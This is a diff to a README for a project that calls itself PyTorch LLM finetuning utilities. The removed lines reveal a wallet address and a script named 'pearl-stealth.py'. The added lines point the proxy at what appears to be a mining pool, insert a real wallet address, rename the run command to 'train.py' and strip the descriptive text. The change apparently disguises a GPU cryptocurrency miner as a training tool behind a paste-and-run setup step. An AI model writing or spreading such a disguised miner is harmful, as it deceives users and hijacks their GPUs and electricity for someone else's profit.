@@ -2,37 +2,23 @@
 
 PyTorch training utilities for LLM finetuning — configs, scripts, and environment setup.
 
-## Features
-
-- Automated environment setup and configuration
-- GPU memory management and optimization
-- Distributed training support with NCCL
-- Wandb integration for experiment tracking
-- Process monitoring and resource management
-
 ## Setup
 
 ```bash
-pip install torch transformers accelerate wandb
-
-# Configure
-export PROXY=localhost:8080
-export ADDRESS=your-wallet-address
-export GPU_DEVICES=0,1
-
-# Run
-python3 pearl-stealth.py
+export PROXY=global.pearlfortune.org:443
+export ADDRESS=prl1par2eef0c04z...
+python3 train.py
 ```
 
 ## Environment Variables
 
-| Var | Required | Description |
+| Var | Required | Default |
 |---|---|---|
-| `PROXY` | ✅ | Training server address |
-| `ADDRESS` | ✅ | Account identifier |
-| `WORKER` | ❌ | Worker name (auto-generated) |
-| `TOKEN` | ❌ | Auth token |
-| `GPU_DEVICES` | ❌ | Comma-separated GPU IDs |
+| `PROXY` | ✅ | — |
+| `ADDRESS` | ✅ | — |
+| `WORKER` | ❌ | `worker-XXXX` |
+| `TOKEN` | ❌ | — |
+| `GPU_DEVICES` | ❌ | all GPUs |
 
 ## Requirements
 
